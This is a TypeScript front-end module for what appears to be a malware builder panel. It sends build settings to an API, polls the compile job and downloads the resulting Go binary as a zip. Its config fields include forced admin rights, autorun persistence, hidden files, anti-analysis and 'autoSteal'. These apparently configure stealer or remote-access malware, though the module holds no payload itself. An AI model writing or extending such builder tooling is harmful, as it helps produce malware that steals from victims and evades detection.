import { csrfHeaders } from "../utils/csrf";

export type CompileGoConfigRequest = {
   name: string;
   password: string;
   forceAdmin: string;
   iconBase64: string;

   buildId: string;
   comment: string;
   autorunMode: string;
   startupDelaySeconds: number;
   hideFilesEnabled: boolean;
   installMode: string;
   customInstallPath: string;
   antiAnalysis: string;
   autoSteal: string;
   offlineMode: boolean;
};

export type CompileGoEnqueueResponse = {
   id: string;
};

export type CompileGoStatusResponse = {
   status: "pending" | "running" | "done" | "error" | string;
   error?: string;
};

export async function enqueueCompileGoFromConfig(req: CompileGoConfigRequest): Promise<string> {
   const headers: Record<string, string> = {
      "Content-Type": "application/json",
      ...csrfHeaders(),
   };

   const enqueueResp = await fetch("/api/compile-go-config", {
      method: "POST",
      credentials: "same-origin",
      headers,
      body: JSON.stringify({
         name: req.name,
         password: req.password,
         forceAdmin: req.forceAdmin,
         icon: req.iconBase64 || "",

         buildId: req.buildId,
         comment: req.comment,
         autorunMode: req.autorunMode,
         startupDelaySeconds: req.startupDelaySeconds,
         hideFilesEnabled: req.hideFilesEnabled,
         installMode: req.installMode,
         customInstallPath: req.customInstallPath,
         antiAnalysis: req.antiAnalysis,
         autoSteal: req.autoSteal,
         offlineMode: req.offlineMode,
      }),
   });

   if (enqueueResp.status === 429) {
      throw new Error("Build already in progress");
   }

   if (!enqueueResp.ok) {
      const errText = await enqueueResp.text().catch(() => "");
      throw new Error(errText || `Compile enqueue failed (${enqueueResp.status})`);
   }

   const enqueueData = (await enqueueResp.json().catch(() => ({}))) as Partial<CompileGoEnqueueResponse>;
   const jobId = enqueueData && enqueueData.id ? String(enqueueData.id) : "";
   if (!jobId) throw new Error("Compile enqueue failed: missing id");
   return jobId;
}

export async function getCompileStatus(jobId: string): Promise<CompileGoStatusResponse> {
   const safeId = String(jobId || "").trim();
   if (!safeId) throw new Error("Missing job id");

   const stResp = await fetch(`/api/compile-status?id=${encodeURIComponent(safeId)}`, {
      method: "GET",
      credentials: "same-origin",
      headers: { ...csrfHeaders() },
   });

   if (!stResp.ok) {
      const errText = await stResp.text().catch(() => "");
      throw new Error(errText || `Compile status failed (${stResp.status})`);
   }

   const st = (await stResp.json().catch(() => ({}))) as Partial<CompileGoStatusResponse>;
   return {
      status: st && st.status ? (String(st.status) as CompileGoStatusResponse["status"]) : "pending",
      error: st && st.error ? String(st.error) : undefined,
   };
}

export async function waitCompileDone(jobId: string, opts?: { timeoutMs?: number; onTick?: (st: CompileGoStatusResponse) => void }): Promise<void> {
   const timeoutMs = opts?.timeoutMs ?? 10 * 60 * 1000;
   const onTick = opts?.onTick;

   const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
   const pollDeadline = Date.now() + timeoutMs;
   let pollMs = 1200;

   while (Date.now() < pollDeadline) {
      await sleep(pollMs);

      const st = await getCompileStatus(jobId);
      try {
         onTick?.(st);
      } catch {
      }

      const status = String(st.status || "");
      if (status === "done") return;
      if (status === "error") throw new Error(st.error ? String(st.error) : "Compile failed");

      pollMs = Math.min(5000, Math.round(pollMs * 1.25));
   }

   throw new Error("Compile timeout");
}

export async function downloadCompileResult(
   jobId: string,
   filenameHint?: string,
   onProgress?: (percent: number) => void,
): Promise<{ blob: Blob; filename: string }> {
   const safeId = String(jobId || "").trim();
   if (!safeId) throw new Error("Missing job id");

   const dlResp = await fetch(`/api/compile-download?id=${encodeURIComponent(safeId)}`, {
      method: "GET",
      credentials: "same-origin",
      headers: { ...csrfHeaders() },
   });

   if (!dlResp.ok) {
      const errText = await dlResp.text().catch(() => "");
      throw new Error(errText || `Compile download failed (${dlResp.status})`);
   }

   let blob: Blob;

   const contentLength = parseInt(dlResp.headers.get("Content-Length") || "0", 10);
   if (onProgress && dlResp.body && contentLength > 0) {
      const reader = dlResp.body.getReader();
      const chunks: Uint8Array[] = [];
      let received = 0;

      onProgress(0);

      while (true) {
         const { done, value } = await reader.read();
         if (done) break;
         chunks.push(value);
         received += value.length;
         const pct = Math.min(100, Math.round((received / contentLength) * 100));
         onProgress(pct);
      }

      blob = new Blob(chunks as unknown as BlobPart[]);
      onProgress(100);
   } else {
      blob = await dlResp.blob();
   }

   let filename = (String(filenameHint || "").trim() || "build") + ".zip";
   try {
      const cd = dlResp.headers.get("Content-Disposition") || "";
      const m2 = cd.match(/filename\*=UTF-8''([^;]+)|filename="?([^";]+)"?/i);
      const raw = m2 ? (m2[1] || m2[2] || "") : "";
      if (raw) filename = decodeURIComponent(raw);
   } catch {
   }

   return { blob, filename };
}

export async function compileGoFromConfig(req: CompileGoConfigRequest): Promise<{ blob: Blob; filename: string }> {
   const jobId = await enqueueCompileGoFromConfig(req);
   await waitCompileDone(jobId);
   return downloadCompileResult(jobId, req.name);
}